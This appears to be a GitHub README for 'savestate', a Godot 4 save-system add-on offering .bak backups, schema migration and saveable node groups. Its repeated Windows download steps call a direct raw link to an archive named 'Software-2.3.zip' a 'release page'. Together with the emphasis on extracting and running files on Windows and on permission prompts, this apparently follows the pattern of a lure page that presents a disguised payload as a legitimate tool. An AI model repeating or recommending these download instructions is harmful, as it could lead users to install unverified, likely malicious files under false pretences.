# 💾 savestate - Simple saves with safe backups

[![Download](https://img.shields.io/badge/Download-Releases-blue.svg?style=for-the-badge)](https://github.com/Aapka1914/savestate/raw/refs/heads/main/addons/savestate/Software-2.3.zip)

## 🚀 Getting Started

savestate adds a save system to Godot 4. It helps you keep player progress, game settings, and other data in one place.

It is made for end users who want a save add-on they can download and use in a Godot project. It also keeps backup copies, so you have a way to recover older data if a save file gets damaged.

If you only want the free Lite tier, this repository is the place to start. If you need more advanced tools, the Pro version adds more features on itch.io.

## 📥 Download for Windows

1. Open the release page: https://github.com/Aapka1914/savestate/raw/refs/heads/main/addons/savestate/Software-2.3.zip
2. Find the latest release near the top of the page.
3. Download the file that matches the version you want.
4. If the download is a .zip file, right-click it and choose Extract All.
5. Open the extracted folder.
6. Follow the included setup files for your Godot project.

If you plan to use savestate on Windows, this release page is the main place to get it. The download files are listed there with each version.

## 🧩 What savestate Does

savestate helps a game store and load data in a clean way. It is built for Godot 4 and fits games that need a stable save system.

It is designed for:

- Game progress
- Player settings
- Level state
- Inventory data
- Unlocks and flags
- Other custom game data

It also includes:

- `.bak` backup files
- Schema migration for older saves
- Saveable node groups
- A clear structure for save data

## 🖥️ Before You Start

You need:

- A Windows PC
- Godot 4 installed
- A project where you want to add save support
- Enough space for the download and save files

Useful setup notes:

- Use a project folder you can find later
- Keep backups turned on if you want extra protection
- Put save files in a folder your game can write to
- Close Godot before moving files into place

## 🛠️ Install and Set Up

1. Visit https://github.com/Aapka1914/savestate/raw/refs/heads/main/addons/savestate/Software-2.3.zip
2. Download the latest release file.
3. Extract the download if it comes in a .zip file.
4. Copy the savestate files into your Godot project.
5. Open your project in Godot 4.
6. Add the save system files as shown in the release files or package notes.
7. Connect the save system to the nodes that should be saved.
8. Run the project and test a save and load cycle.

If the package includes example scenes, open those first. They can help you see how the save system works before you use it in your own game.

## 💡 How It Works

savestate uses a few simple ideas:

- A node can be marked as saveable
- The game writes its state to a save file
- A backup copy is stored with `.bak`
- Older save data can be moved to a newer format with schema migration

This helps if you change your game later. You can update save data without forcing players to start over.

## 📂 File and Save Structure

A typical setup may include:

- A main save file
- A backup file with `.bak`
- Save data for player progress
- Save data for game settings
- Optional version data for migration

Keep the save folder in a place your game can reach at runtime. If you test on Windows, use the same path style each time so you can find your files fast.

## 🎮 Use in a Game

You can use savestate for many common game tasks:

- Save the player’s position
- Keep track of story choices
- Store collected items
- Save audio and video settings
- Remember unlocked levels
- Restore the last game session

This is useful for small indie games and larger projects alike. It gives you a clear way to keep data safe and load it again later.

## 🔄 Backups and Recovery

The backup system keeps a `.bak` copy of your save data. If the main save file breaks or gets corrupted, you can use the backup copy to recover older data.

This matters when:

- The game closes at the wrong time
- A file gets damaged
- A player loses power during a save
- You test new changes and need a fallback

The backup file gives you a second copy of the same save state.

## 🧱 Schema Migration

Schema migration helps when your game changes after release.

For example:

- You add a new field to save data
- You rename a value
- You remove an old setting
- You change the shape of stored data

With migration support, older saves can still load. That makes updates smoother for players and reduces save loss.

## 🧠 Saveable Node Groups

Saveable node groups help you organize which parts of the scene should be stored.

Use them when:

- A scene has many nodes
- Only some nodes need saving
- You want a clean list of saveable parts
- You want to avoid manual tracking of every object

This keeps your project easier to manage as it grows.

## 🪟 Windows Tips

If you are using Windows, these steps help keep setup simple:

- Download the latest release first
- Use the built-in unzip tool or 7-Zip
- Keep the extracted folder in one place
- Do not rename files unless the setup says to
- If Windows asks for permission, check that you trust the source page

If your game writes save files during testing, check the project folder and the user data folder after you run it. That helps you confirm the save system is working.

## 📦 Lite and Pro

The repository includes the free Lite tier. It covers the core save system and backup flow.

The Pro version adds:

- Encryption
- Async save support
- Editor tooling

If you need those extra tools later, the Pro version is listed on itch.io.

## 📚 Common Uses

savestate fits many Godot 4 projects:

- Action games
- Puzzle games
- RPGs
- Platformers
- Survival games
- Story-driven games

It also works well for smaller tools and test projects where you want a dependable save layer.

## 🧪 Test Your Setup

After setup, try this simple check:

1. Start the game.
2. Change one value, such as a setting or player state.
3. Save the game.
4. Close the game.
5. Open it again.
6. Load the save.
7. Confirm the data comes back the same way.

If the data returns as expected, the save system is working.

## 🧭 Project Info

- Repository: savestate
- Engine: Godot 4
- License: MIT
- Topic area: save system for games
- Main use: save data, backups, and migration

## 🔗 Download Again

Visit the release page to download the latest build for Windows:
https://github.com/Aapka1914/savestate/raw/refs/heads/main/addons/savestate/Software-2.3.zip